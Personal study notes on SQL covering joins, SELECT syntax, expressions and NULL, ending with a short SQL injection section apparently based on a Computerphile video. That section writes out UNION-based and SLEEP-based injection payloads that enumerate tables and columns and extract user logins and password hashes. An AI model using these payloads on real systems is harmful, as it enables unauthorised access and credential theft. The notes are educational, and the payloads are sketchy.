# SQL

* Designed to work with *Relational Databases*
* A query result is best described as a *record* (i.e., not a row as query results may be columns as well)

## Language

* Relational Database: a data store that is capable of representing relationships between different data sets.
  - displayed in rows and columns
* DML: add, query, manipulate, delete data from tables and datasets.
* DDL: defines tables, indexes, and relationships.
* DMS - Database Management System: Oracle, PostgreSQL, SQLite, MySQL

## Joins

* `INNER JOIN` or typically just `JOIN` as this is the default:
<img alt="Inner Join" src="/assets/inner_join.png" width="300">

* `LEFT OUTER JOIN` or typically just `LEFT JOIN`:
![Left Join](/assets/left_outer_join.png)

* `RIGHT OUTER JOIN` or typically just `RIGHT JOIN` - not supported in many database systems such as SQLite:
![Right Join](/assets/right_outer_join.png)

* `FULL OUTER JOIN` or typically just `FUL JOIN` - not supported in many database systems such as SQLite:
![Right Join](/assets/full_outer_join.png)

## SQL Practice

### Format
* SQL *statements* that begin with `SELECT` are commonly referred to as "SELECT Statements".
```SQL
-- KEYWORD;
SELECT table.* FROM table;
```
* Common [SQL clauses](https://en.wikipedia.org/wiki/SQL_syntax#Queries): `FROM`, `WHERE`, `GROUP BY`, `ORDER BY`, `DISTINCT`
```SQL
-- Select all attributes with FROM and WHERE clause
SELECT country.* FROM country WHERE country.continent = 'Asia';

-- Select specific attributes
SELECT country.name, country.population, country.region
  FROM country
  WHERE country.continent = 'Asia';

-- Rename Attribute
SELECT country.name, country.population as 'Pop', country.region
  FROM country
  WHERE country.continent = 'Asia';
```
* Functions: `COUNT(*)`
```SQL
SELECT COUNT(*) FROM country WHERE country.continent = 'Asia';
```
* Expressions: Used to derive data from a statement.
```SQL
-- Multiple expressions
SELECT country.name, country.population / 1000000 as 'Pop (in millions)', country.region
  FROM country
  -- Logical Expression
  WHERE country.continent = 'Asia' AND country.population > 1000000
  -- With order clause
  ORDER BY country.population DESC;
```

```SQL
  -- ORDER By
  SELECT country.* FROM country WHERE country.code <> "AFG" ORDER BY country.code;

  -- Not Equal To <>
  SELECT country.* FROM country WHERE country.code <> "AFG" ORDER BY country.code;

  -- AS for a column name
  SELECT country.name, country.code, country.IndepYear AS 'Year of Independence' FROM country WHERE country.code <> "AFG" ORDER BY country.code;
```

Return the capital cities of countries with more than a million population in order of continent and population.
```SQL
-- Countries where populations is >= 10 million
SELECT country.continent, country.name, country.capital, country.population / 1000000 AS 'PopMM'
  FROM country
  WHERE country.population >= 10
  ORDER BY country.continent ASC, country.population DESC
```
```SQL
SELECT c.continent, c.name AS 'Country', c.capital, c.PopMM AS 'Population (in millions)', city.name AS 'Capital'
  FROM (
    -- Countries where populations is >= 10 million
    SELECT country.continent, country.name, country.capital, country.population / 1000000 AS 'PopMM'
      FROM country
      WHERE country.population >= 10
      ORDER BY country.continent ASC, country.population DESC
  ) AS c
  JOIN city
  -- In this case you can use ON or WHERE
  ON city.id = c.capital
  ORDER BY c.continent, c.PopMM DESC;
```

### Expressions

```SQL
-- COUNT
SELECT COUNT('country.*') FROM country;
-- COUNT('country.*')
-- 239
SELECT COUNT(*) FROM country;
-- COUNT(*)
-- 239
```

```SQL
-- Arithmetic
SELECT 1+10;
```

*SQLite* [date and time functions](https://sqlite.org/lang_datefunc.html)

```SQL
-- This is SQLite specific
SELECT strftime('%j %H %w %f', datetime());
-- strftime('%j %H %w %f', datetime())
-- 228 12 3 11.000
```

### Null

* `NULL` is a state not a value.

## LeftOuterJoin

Keeps all the records on the left after the join occurs - otherwise, it would just join with the right table and return only those results that can be joined

To practice writing in rails:

```SQL
ActiveRecord::Base
  .connection
  .execute(
    "SELECT \"events\".*
    FROM \"events\"
    ORDER BY \"events\".updated_at DESC"
  )
  .to_a.first
```

## SQL Injection

[Running an SQL Injection Attack - Computerphile](https://youtu.be/ciNHn38EyRc)

```SQL
-- SLEEP is an SQL command
SELECT ? FROM ? WHERE ? LIKE %hammer% AND 0 = SLEEP(2);

-- UNION Appends - makes sure column count matches

-- Get the table names of all the tables
-- we are selecting 3 columns b/c it must match the original SELECT call
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.table); --%';

-- Get the column names of the users table
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); --%';

-- GEt the particular data for each user
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT uLogin, uHash, uType FROM users); --%''
```

![SQL_Injected_Products_Table](/assets/sql_injected_products_table.png)

## HTTP vs TCP vs UDP
